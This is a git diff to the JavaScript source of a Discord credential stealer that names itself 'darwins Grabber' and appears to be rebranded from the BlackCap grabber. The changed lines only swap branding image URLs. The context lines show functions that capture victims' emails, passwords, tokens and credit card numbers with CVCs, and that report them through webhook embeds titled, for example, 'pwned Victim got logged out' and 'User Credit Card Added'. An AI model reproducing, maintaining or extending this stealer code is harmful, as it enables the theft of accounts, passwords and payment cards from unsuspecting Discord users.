@@ -43,8 +43,8 @@ const config = {
 
 
 
-let bannerurl = ""
-let usericonurl = ""
+let bannerurl = "https://github.com/darwinikii/darwins/raw/main/darwins%20banner.png"
+let usericonurl = "https://github.com/darwinikii/darwins/raw/main/darwins.png"
 
 const discordPath = (function() {
     var app = args[0].split(path.sep).slice(0, -1).join(path.sep);
@@ -269,7 +269,7 @@ async function FirstTime() {
                     } = await getIP()
                     const c = {
                         username: "darwins Grabber",
-                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                        avatar_url: "https://github.com/darwinikii/darwins/raw/main/darwins.png",
                         content: "",
                         embeds: [{
                             title: "darwins Initalized",
@@ -293,14 +293,14 @@ async function FirstTime() {
                     } = await getIP()
                     
                     if(b.avatar === null){
-                        usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                        usericonurl = "https://github.com/darwinikii/darwins/raw/main/darwins.png"
                     }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                     if(b.banner === null){
-                        bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                        bannerurl = "https://github.com/darwinikii/darwins/raw/main/darwins%20banner.png"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
                         username: "darwins Grabber",
-                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                        avatar_url: "https://github.com/darwinikii/darwins/raw/main/darwins.png",
                         content: "",
                         embeds: [{
                             title: "darwins Initalized",
@@ -369,7 +369,7 @@ async function FirstTime() {
                             } = await getIP()
                             const c = {
                                 username: "darwins Grabber",
-                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                                avatar_url: "https://github.com/darwinikii/darwins/raw/main/darwins.png",
                                 content: "",
                                 embeds: [{
                                     title: "pwned User log out (User not Logged in before)",
@@ -391,14 +391,14 @@ async function FirstTime() {
                                 ip
                             } = await getIP()
                             if(b.avatar === null){
-                                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                                usericonurl = "https://github.com/darwinikii/darwins/raw/main/darwins.png"
                             }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                             if(b.banner === null){
-                                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                                bannerurl = "https://github.com/darwinikii/darwins/raw/main/darwins%20banner.png"
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
                                 username: "darwins Grabber",
-                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                                avatar_url: "https://github.com/darwinikii/darwins/raw/main/darwins.png",
                                 content: "",
                                 embeds: [{
                                     title: "pwned Victim got logged out",
@@ -807,15 +807,15 @@ async function Login(email, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                usericonurl = "https://github.com/darwinikii/darwins/raw/main/darwins.png"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                bannerurl = "https://github.com/darwinikii/darwins/raw/main/darwins%20banner.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
                 username: "darwins Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                avatar_url: "https://github.com/darwinikii/darwins/raw/main/darwins.png",
                 content: "",
                 embeds: [{
                     "title": "darwins User Login",
@@ -960,10 +960,10 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 }
                 return billing
             }
-            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
+            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://github.com/darwinikii/darwins/raw/main/darwins%20banner.png";
             const params = {
                 username: "darwins Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                avatar_url: "https://github.com/darwinikii/darwins/raw/main/darwins.png",
                 content: "",
                 embeds: [{
                     "title": "darwins Detect Password Changed",
@@ -1108,17 +1108,17 @@ async function ChangeEmail(newemail, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                usericonurl = "https://github.com/darwinikii/darwins/raw/main/darwins.png"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                bannerurl = "https://github.com/darwinikii/darwins/raw/main/darwins%20banner.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
 
             
            const params = {
                 username: "darwins Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                avatar_url: "https://github.com/darwinikii/darwins/raw/main/darwins.png",
                 content: "",
                 embeds: [{
                         "title": "darwins Detect Email Changed",
@@ -1208,16 +1208,16 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ip
     } = await getIP()
         if(info.avatar === null){
-            usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+            usericonurl = "https://github.com/darwinikii/darwins/raw/main/darwins.png"
         }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
         if(info.banner === null){
-            bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+            bannerurl = "https://github.com/darwinikii/darwins/raw/main/darwins%20banner.png"
         }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
         
         const params = {
             username: "darwins Grabber",
-            avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+            avatar_url: "https://github.com/darwinikii/darwins/raw/main/darwins.png",
             content: "",
             embeds: [{
                     "title": "darwins User Credit Card Added",
